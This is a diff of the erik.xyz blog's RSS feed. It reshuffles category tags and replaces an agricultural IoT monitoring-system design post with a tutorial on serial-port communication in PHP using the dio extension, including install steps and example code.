@@ -5,48 +5,44 @@
         <link>https://erik.xyz</link>
         <description>一只PHP开发的程序猿，偶尔做做运维、Goland、Python、Java、摄影、画画、写作、顺便睡觉，反正整站都搞过。</description>
         <language>zh-CN</language>
-        <pubDate>Wed, 25 Dec 2024 13:34:00 +0800</pubDate>
-        <lastBuildDate>Wed, 25 Dec 2024 13:34:00 +0800</lastBuildDate>
-        <category>php扩展</category>
-        <category>php技巧</category>
-        <category>php类库</category>
-        <category>php资源</category>
+        <pubDate>Fri, 03 Jan 2025 15:30:00 +0800</pubDate>
+        <lastBuildDate>Fri, 03 Jan 2025 15:30:00 +0800</lastBuildDate>
         <category>日志</category>
         <category>工具</category>
         <category>jquery</category>
         <category>jquery插件</category>
         <category>js</category>
+        <category>php扩展</category>
+        <category>php技巧</category>
+        <category>php类库</category>
+        <category>php资源</category>
         <category>css</category>
         <category>php</category>
         <category>web</category>
         <category>代码</category>
         <category>压缩</category>
+        <category>说说</category>
+        <category>趣闻</category>
         <category>php服务器</category>
         <category>随笔</category>
         <category>php实例</category>
-        <category>说说</category>
-        <category>趣闻</category>
-        <category>nginx</category>
         <category>转载</category>
         <category>php库</category>
         <category>互联</category>
         <category>项目实战</category>
         <category>javascript</category>
-        <category>漏洞</category>
+        <category>nginx</category>
         <category>php应用</category>
         <category>浮点</category>
+        <category>漏洞</category>
+        <category>负载均衡</category>
         <category>http</category>
         <category>http服务器</category>
-        <category>负载均衡</category>
-        <category>kali</category>
-        <category>kali安装</category>
-        <category>农业系统</category>
-        <category>系统设计</category>
         <category>克莱姆法则</category>
         <category>行列式</category>
         <category>n阶行列式</category>
-        <category>支付系统</category>
-        <category>支付</category>
+        <category>kali</category>
+        <category>kali安装</category>
         <category>centos</category>
         <category>linux</category>
         <category>apache优化</category>
@@ -54,6 +50,8 @@
         <category>nginx优化</category>
         <category>nginx隐藏index</category>
         <category>日常</category>
+        <category>支付系统</category>
+        <category>支付</category>
         <category>seo</category>
         <category>优化</category>
         <category>摘要</category>
@@ -105,6 +103,7 @@
         <category>容器</category>
         <category>cncf</category>
         <category>监控</category>
+        <category>composer</category>
         <category>cphalcon</category>
         <category>cphalcon报错</category>
         <category>css中的em</category>
@@ -124,6 +123,8 @@
         <category>emergency</category>
         <category>emergency mode</category>
         <category>deepin黑屏</category>
+        <category>清理系统</category>
+        <category>清理c盘</category>
         <category>dns</category>
         <category>域名监测</category>
         <category>网站监测</category>
@@ -149,8 +150,8 @@
         <category>ping服务器</category>
         <category>各大网站ping</category>
         <category>搜引擎ping服务器</category>
-        <category>go中pdf生成</category>
         <category>go获取ip</category>
+        <category>go中pdf生成</category>
         <category>go中限流</category>
         <category>go对接快递签名</category>
         <category>go时间获取</category>
@@ -220,12 +221,12 @@
         <category>linux运行命令报错</category>
         <category>web前端</category>
         <category>web优化</category>
-        <category>maven搭建库</category>
-        <category>maven</category>
-        <category>maven内网库</category>
         <category>撮合算法</category>
         <category>撮合</category>
         <category>php撮合算法</category>
+        <category>maven搭建库</category>
+        <category>maven</category>
+        <category>maven内网库</category>
         <category>高级缓存配置</category>
         <category>mongodb</category>
         <category>mongodb权限</category>
@@ -287,6 +288,7 @@
         <category>php-zookeeper</category>
         <category>zookeeper3.5.5</category>
         <category>php-zookeeper扩展</category>
+        <category>php串口开发</category>
         <category>php倒计时</category>
         <category>php时间</category>
         <category>倒计时</category>
@@ -309,10 +311,10 @@
         <category>php中if</category>
         <category>php中if判断</category>
         <category>php的if</category>
-        <category>php字符串</category>
         <category>php7中sphinx</category>
         <category>php7中sphinx扩展</category>
         <category>sphinx扩展</category>
+        <category>php字符串</category>
         <category>python</category>
         <category>python库</category>
         <category>a标签</category>
@@ -320,9 +322,9 @@
         <category>虚线框</category>
         <category>R语言</category>
         <category>数据随机化</category>
+        <category>redis监控</category>
         <category>redis总结</category>
         <category>redis命令</category>
-        <category>redis监控</category>
         <category>redis锁</category>
         <category>redis分布式锁</category>
         <category>任意金额输入</category>
@@ -333,6 +335,8 @@
         <category>链表</category>
         <category>数据结构</category>
         <category>线性结构</category>
+        <category>浏览器禁止操作视频</category>
+        <category>禁止视频</category>
         <category>响应慢</category>
         <category>页面优化</category>
         <category>js编辑</category>
@@ -411,7 +415,6 @@
         <category>xhprof</category>
         <category>webman</category>
         <category>laravel</category>
-        <category>composer</category>
         <category>composer插件</category>
         <category>html</category>
         <category>响应式分辨率</category>
@@ -455,202 +458,53 @@
         <category>谷歌</category>
         <category>谷歌搜索</category>
         <item>
-            <guid isPermalink="true">https://erik.xyz/2024/12/25/agricultural-detection-system/</guid>
-            <title>农业检测系统设计</title>
-            <link>https://erik.xyz/2024/12/25/agricultural-detection-system/</link>
-            <category>农业系统</category>
-            <category>系统设计</category>
-            <pubDate>Wed, 25 Dec 2024 13:34:00 +0800</pubDate>
-            <description><![CDATA[ &lt;p&gt;&lt;b&gt;农业检测系统设计&lt;/b&gt;&lt;/p&gt;
-&lt;p&gt;根据你的需求，我们将设计一个智能农业系统，通过多种技术手段实现温湿度、光照度监测、设备控制和远程管理。系统的核心功能包括：智能节点监控环境数据、手动和自动控制模式、通过 LoRa 和 4G 通信传输数据、以及通过手机或电脑端进行远程控制。&lt;br&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;h4 id=&#34;1-系统模块概述&#34;&gt;&lt;a href=&#34;#1-系统模块概述&#34; class=&#34;headerlink&#34; title=&#34;1. 系统模块概述&#34;&gt;&lt;/a&gt;&lt;b&gt;1. 系统模块概述&lt;/b&gt;&lt;/h4&gt;&lt;p&gt;该农业检测系统包括以下几个主要模块：&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;&lt;p&gt;智能节点（传感器与控制单元）：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;获取温湿度、光照度传感器数据。&lt;/li&gt;
-&lt;li&gt;控制风扇的启停，显示当前风扇状态。&lt;/li&gt;
-&lt;li&gt;支持手动和自动模式切换。&lt;/li&gt;
-&lt;li&gt;显示温湿度、光照度、风扇状态和模式状态。&lt;/li&gt;
-&lt;li&gt;通过 LoRa 发送数据到 4G 节点。&lt;/li&gt;
-&lt;/ul&gt;
+            <guid isPermalink="true">https://erik.xyz/2025/01/03/php-serial-port-development/</guid>
+            <title>php串口开发</title>
+            <link>https://erik.xyz/2025/01/03/php-serial-port-development/</link>
+            <category>php</category>
+            <category>php串口开发</category>
+            <pubDate>Fri, 03 Jan 2025 15:30:00 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;使用外置设备，通过串口发送和接收数据。那么，就要在php端有个串口的操作代码。&lt;br&gt;PHP 的 dio 扩展（Direct I/O）提供了对底层 I/O 操作的访问，包括串口通信。通过 dio 扩展，你可以直接操作串口设备文件（如 /dev/ttyUSB0 或 COM1）来实现串口通信。&lt;br&gt; &lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;h3 id=&#34;1-安装-dio-扩展&#34;&gt;&lt;a href=&#34;#1-安装-dio-扩展&#34; class=&#34;headerlink&#34; title=&#34;1. 安装 dio 扩展&#34;&gt;&lt;/a&gt;1. 安装 dio 扩展&lt;/h3&gt;&lt;p&gt;dio 扩展是 PHP 的一个 PECL 扩展。你可以通过以下步骤安装：&lt;/p&gt;
+&lt;p&gt;在 Linux 上安装：&lt;br&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo apt-get install php-dev  # 安装 PHP 开发工具&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo pecl install dio         # 安装 dio 扩展&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;安装完成后，在 php.ini 文件中启用扩展：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;extension=dio.so&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h3 id=&#34;2-使用-dio-实现串口通信&#34;&gt;&lt;a href=&#34;#2-使用-dio-实现串口通信&#34; class=&#34;headerlink&#34; title=&#34;2. 使用 dio 实现串口通信&#34;&gt;&lt;/a&gt;2. 使用 dio 实现串口通信&lt;/h3&gt;&lt;p&gt;以下是一个使用 dio 扩展实现串口通信的示例代码：&lt;br&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;// 串口设备路径&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$device = &amp;#x27;/dev/pts/4&amp;#x27;; // Linux&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;// $device = &amp;#x27;COM1&amp;#x27;;      // Windows&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;// 打开串口设备&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$fd = dio_open($device, O_RDWR | O_NOCTTY | O_NONBLOCK);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if (!$fd) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    die(&amp;quot;无法打开串口设备: $device\n&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;// 配置串口参数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dio_tcsetattr($fd, [&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;baud&amp;#x27; =&amp;gt; 9600,          // 波特率&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;bits&amp;#x27; =&amp;gt; 8,             // 数据位&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;stop&amp;#x27; =&amp;gt; 1,             // 停止位&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;parity&amp;#x27; =&amp;gt; 0,           // 校验位 (0: none, 1: odd, 2: even)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;flow_control&amp;#x27; =&amp;gt; 0,     // 流控制 (0: none, 1: hardware)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;// 发送数据到串口&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$message = &amp;quot;你好我在https://erik.xyz上出生了！&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dio_write($fd, $message);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;已发送: $message&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;// 从串口读取数据&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$data = dio_read($fd, 1024); // 读取最多 1024 字节&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;已接收: $data\n&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;// 关闭串口&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dio_close($fd);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;h3 id=&#34;3-代码说明&#34;&gt;&lt;a href=&#34;#3-代码说明&#34; class=&#34;headerlink&#34; title=&#34;3. 代码说明&#34;&gt;&lt;/a&gt;3. 代码说明&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;dio_open: 打开串口设备文件。O_RDWR 表示以读写模式打开，O_NOCTTY 表示不将设备作为控制终端，O_NONBLOCK 表示非阻塞模式。&lt;/p&gt;
 &lt;/li&gt;
-&lt;li&gt;&lt;p&gt;4G 网关节点：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;接收来自智能节点的传感器数据。&lt;/li&gt;
-&lt;li&gt;将数据通过 4G 网络上传至 MOTT 服务器。&lt;/li&gt;
-&lt;li&gt;在显示屏上显示各项传感器数据。&lt;/li&gt;
-&lt;/ul&gt;
+&lt;li&gt;&lt;p&gt;dio_tcsetattr: 配置串口参数，包括波特率、数据位、停止位、校验位和流控制。&lt;/p&gt;
 &lt;/li&gt;
-&lt;/ol&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;p&gt;MOTT 服务器：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;存储从 4G 节点发送来的数据。&lt;/li&gt;
-&lt;li&gt;提供远程访问接口。&lt;/li&gt;
-&lt;/ul&gt;
+&lt;li&gt;&lt;p&gt;dio_write: 向串口写入数据。&lt;/p&gt;
 &lt;/li&gt;
-&lt;li&gt;&lt;p&gt;应用软件（电脑端或手机端）：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;显示温湿度、光照度、风扇状态、手动/自动模式等数据。&lt;/li&gt;
-&lt;li&gt;提供登录、手动控制、自动控制等功能。&lt;/li&gt;
-&lt;/ul&gt;
+&lt;li&gt;&lt;p&gt;dio_read: 从串口读取数据。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;dio_close: 关闭串口设备。&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
-&lt;h4 id=&#34;2-系统功能设计&#34;&gt;&lt;a href=&#34;#2-系统功能设计&#34; class=&#34;headerlink&#34; title=&#34;2.系统功能设计&#34;&gt;&lt;/a&gt;&lt;b&gt;2.系统功能设计&lt;/b&gt;&lt;/h4&gt;&lt;p&gt;2.1 智能节点功能&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;&lt;p&gt;传感器数据采集：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;温湿度传感器：实时获取温度和湿度数据。&lt;/li&gt;
-&lt;li&gt;光照度传感器：实时获取光照强度数据。&lt;/li&gt;
-&lt;/ul&gt;
+&lt;h3 id=&#34;4-串口参数配置&#34;&gt;&lt;a href=&#34;#4-串口参数配置&#34; class=&#34;headerlink&#34; title=&#34;4. 串口参数配置&#34;&gt;&lt;/a&gt;4. 串口参数配置&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;dio_tcsetattr 的配置选项：&lt;/p&gt;
 &lt;/li&gt;
-&lt;/ol&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;p&gt;模式切换：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;手动模式：允许用户通过按键手动启动或停止风扇。&lt;/li&gt;
-&lt;li&gt;自动模式：当温度和光照度超过设定阈值时，自动启停风扇。&lt;/li&gt;
-&lt;/ul&gt;
+&lt;li&gt;&lt;p&gt;baud: 波特率（如 9600、19200、38400、57600、115200）。&lt;/p&gt;
 &lt;/li&gt;
-&lt;li&gt;&lt;p&gt;风扇控制：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;在手动模式下，用户通过按键控制风扇开关，并通过绿色 LED 指示灯显示风扇状态。&lt;/li&gt;
-&lt;li&gt;在自动模式下，系统会根据设定的温度和光照度阈值自动控制风扇，并使用绿灯和红灯进行状态指示。&lt;/li&gt;
-&lt;/ul&gt;
+&lt;li&gt;&lt;p&gt;bits: 数据位（通常为 8）。&lt;/p&gt;
 &lt;/li&gt;
-&lt;li&gt;&lt;p&gt;数据传输：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;使用 LoRa 无线传输模块将传感器数据和风扇状态上传至 4G 网关节点。&lt;/li&gt;
-&lt;/ul&gt;
+&lt;li&gt;&lt;p&gt;stop: 停止位（1 或 2）。&lt;/p&gt;
 &lt;/li&gt;
-&lt;li&gt;&lt;p&gt;显示屏：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;显示当前温湿度、光照度、模式状态和风扇状态。&lt;/li&gt;
-&lt;/ul&gt;
+&lt;li&gt;&lt;p&gt;parity: 校验位（0: 无校验，1: 奇校验，2: 偶校验）。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;flow_control: 流控制（0: 无流控制，1: 硬件流控制）。&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;&lt;b&gt;2.2 4G 网关节点功能&lt;/b&gt;&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;&lt;p&gt;数据接收：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;通过 LoRa 接收智能节点上传的传感器数据（温度、湿度、光照度、风扇状态、手动/自动模式状态）。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;p&gt;4G 网络传输：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;将智能节点的数据通过 4G 网络上传至 MOTT 服务器。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;显示屏显示：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;在 4G 网关节点的显示屏上展示温湿度、光照度、模式状态和风扇状态。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;b&gt;2.3 MOTT 服务器功能&lt;/b&gt;&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;&lt;p&gt;数据存储：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;存储来自 4G 网关节点的温湿度、光照度、风扇状态等数据。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;p&gt;远程管理接口：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;提供 RESTful API 或 WebSocket 接口，供客户端应用访问。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;b&gt;2.4 应用软件功能&lt;/b&gt;&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;用户登录：&lt;ul&gt;
-&lt;li&gt;提供登录界面，用户通过输入用户名和密码登录（用户名：admin，密码：admin123）。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;p&gt;手动控制：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;登录成功后，用户可通过界面手动启停风扇，操作时触发红灯和蜂鸣器的提示。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;自动控制：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;用户可以设定温度和光照度的阈值，智能节点进入自动模式后，系统根据传感器数据自动控制风扇开关，并通过 LED 指示灯显示状态。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;显示功能：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;实时显示温度、湿度、光照度、风扇状态、手动/自动模式状态。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h4 id=&#34;3-原型图设计&#34;&gt;&lt;a href=&#34;#3-原型图设计&#34; class=&#34;headerlink&#34; title=&#34;3. 原型图设计&#34;&gt;&lt;/a&gt;&lt;b&gt;3. 原型图设计&lt;/b&gt;&lt;/h4&gt;&lt;p&gt;3.1 智能节点原型图&lt;br&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;+-------------------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|    温湿度传感器          |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|                         |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|    光照度传感器          |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|                         |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|    按键面板 (5个按键)    |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|                         |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|    显示屏 (LCD)          |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|                         |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|    风扇控制 (LED/蜂鸣器) |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+-------------------------+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;显示屏：显示温度、湿度、光照度、当前模式（手动/自动）和风扇状态。&lt;/li&gt;
-&lt;li&gt;按键面板：5个按键，其中包括：&lt;ul&gt;
-&lt;li&gt;切换模式按键（手动/自动）&lt;/li&gt;
-&lt;li&gt;启动风扇的控制按键&lt;/li&gt;
-&lt;li&gt;停止风扇的控制按键&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;LED 灯：指示风扇是否正在运行（绿色为运行，红色为停止）。&lt;/li&gt;
-&lt;li&gt;蜂鸣器：在风扇运行时以 1Hz 的频率发出声音。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;b&gt;3.2 4G 网关节点原型图&lt;/b&gt;&lt;/p&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;+-------------------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|    LoRa 接收模块        |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|    (接收数据)           |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|                         |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|    显示屏 (LCD)          |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|                         |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|    4G 网络模块          |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|    (上传数据)           |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+-------------------------+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;ul&gt;
-&lt;li&gt;显示屏：显示温湿度、光照度、模式状态和风扇状态。&lt;/li&gt;
-&lt;li&gt;LoRa 接收模块：接收智能节点发送的传感器数据。&lt;/li&gt;
